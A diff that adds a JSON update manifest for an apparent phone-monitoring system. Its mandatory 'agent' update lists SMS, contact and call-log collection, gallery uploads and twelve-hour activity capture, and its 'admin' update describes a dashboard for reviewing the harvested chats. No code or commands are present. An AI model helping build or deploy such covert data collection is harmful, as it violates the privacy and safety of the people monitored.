@@ -1,0 +1,14 @@
+{
+  "agent": {
+    "versionCode": 5,
+    "versionName": "1.0.4",
+    "mandatory": true,
+    "notes": "SMS + Contacts + Call Logs collection. Gallery binary upload. Full 12h activity capture."
+  },
+  "admin": {
+    "versionCode": 3,
+    "versionName": "1.0.2",
+    "mandatory": true,
+    "notes": "Complete redesign with per-app chat tabs, conversation view, gallery, dashboard, splash animation, unlock buzzer."
+  }
+}
